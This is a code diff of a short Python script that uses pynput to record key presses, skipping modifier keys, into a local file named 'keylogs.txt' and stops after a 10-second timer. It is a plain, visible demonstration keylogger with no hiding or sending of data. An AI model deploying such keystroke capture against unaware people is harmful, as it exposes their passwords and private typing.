@@ -1,16 +1,24 @@
 from threading import Timer
-from pynput import keyboard
+from pynput.keyboard import Key,Listener
 
-f = open('nt.txt','w')
+def on_press(k):
 
-def on_press(key):
-    global x
-    if key != keyboard.Key.shift:
-        f.write(f'pressed {key}\n')   
+    # we print only letters, digits and symbols, not the hotkeys
+    if k != Key.shift_l and k != Key.shift_r and k != Key.ctrl_l  and k != Key.ctrl_r and k != Key.caps_lock:
+        f.write(f'{k}')  
+
+if __name__ == '__main__':
     
-with keyboard.Listener(on_press=on_press) as l:
-    Timer(10, l.stop).start()
-    l.join()
-    print('10 seconds passed')
+    timelimit = 10  # it sets the timelimit of the listener
+    f = open('keylogs.txt','w')   # opens/creates a file named 'keylogger.txt'
 
-f.close()
+    # starting of listener
+    with Listener(on_press=on_press) as listen:
+        
+        Timer(timelimit, listen.stop).start()  
+        # the timer stops the listener after the timelimit  
+        
+        listen.join()
+        print(f'{timelimit} seconds passed')
+
+    f.close()   # closes the file
